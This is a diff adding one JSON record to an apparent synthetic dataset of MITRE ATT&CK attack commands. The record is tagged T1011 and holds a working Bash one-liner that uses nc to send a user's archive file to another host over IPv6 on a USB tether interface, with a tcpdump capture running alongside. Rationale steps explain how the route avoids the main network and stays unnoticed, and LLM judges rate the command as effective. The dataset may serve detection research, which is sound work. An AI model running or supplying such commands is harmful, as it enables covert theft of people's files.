@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i usb0 -nn 'ip6 and tcp port 54531' -U -w /dev/null >/dev/null 2>&1 & nc -6 -s fe80::a00:27ff:fe12:3456%usb0 fe80::2%usb0 54531 < /home/user/.local/share/archive.tgz",
+  "explanation": "Uses IPv6 over a USB tether interface (usb0) to exfiltrate via a non-standard TCP port, monitored narrowly by tcpdump. This is a separate medium and protocol path consistent with T1011.",
+  "rationale_steps": [
+    "Constrain traffic to IPv6 on usb0 to avoid the primary IPv4 LAN.",
+    "Use high TCP port 54531 to minimize notice.",
+    "Run tcpdump with an IPv6 filter and discard capture.",
+    "nc -6 with a scoped link-local source ties the flow to usb0."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-182a2b43",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash one-liner with balanced quotes, valid flags, correct redirections, and proper backgrounding using '&'.",
+        "semantic_score": 4,
+        "semantic_justification": "Netcat exfiltrates the file over IPv6 via usb0 on a non-standard port as claimed, though tcpdump likely needs elevated privileges and discards output, and there is no scheduling/retry automation.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T03:53:59.686449Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags for both tcpdump and netcat, and correct redirection syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements automated exfiltration by using netcat to transfer an archive file over IPv6 via a USB interface while using tcpdump to monitor the connection, aligning perfectly with the T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:54:02.195691Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct Bash syntax for command execution, redirection, backgrounding, and valid flags for all tools involved.",
+        "semantic_score": 3,
+        "semantic_justification": "While the `nc` command successfully implements automated IPv6 exfiltration over a non-standard port, the `tcpdump` command included for 'monitoring' will fail without root privileges, which contradicts the stated 'Privilege: None' and the overall claimed intent of the command.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:53:34.877891Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
